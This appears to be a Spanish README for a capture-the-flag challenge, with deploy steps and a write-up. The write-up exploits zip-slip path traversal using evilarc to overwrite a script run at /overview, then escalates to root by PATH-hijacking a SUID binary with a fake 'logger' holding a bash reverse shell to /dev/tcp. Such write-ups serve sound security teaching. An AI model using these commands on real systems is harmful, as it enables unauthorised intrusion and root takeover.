#Instrucciones para deploy
- Dentro de application ```sudo chown root *```
- Luego ```sudo chown www-data uploads overview.sh```
- ```python3 run.py```

#Writeup

Generamos un .zip con un archivo que se llame ../overview.sh asi sobreescribimos el script que se ejecuta al visitar /overview. Para ello podemos usar la herramienta [evilarc](https://github.com/ptoomey3/evilarc).
```
python evilarc.py -o unix -d 1 overview.sh
```
Visitamos /overview para que se ejecute el script que hemos subido.
Obtenemos acceso como www-data.
Vemos en el directorio update un binario que ejecuta un script firmware_update.sh como root.
Path hijacking en el script firmware_update.sh (SUID) del binario logger, creamos un archivo ejecutable (logger):
```
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```
Y modificamos nuestra variable de entorno PATH anyadiendo la ruta en la que creamos el ejecutable (logger).
```
export PATH=$(pwd):$PATH
```
Por ultimo ejecutamos el binario firmware_update y obtenemos nuestra shell como root.
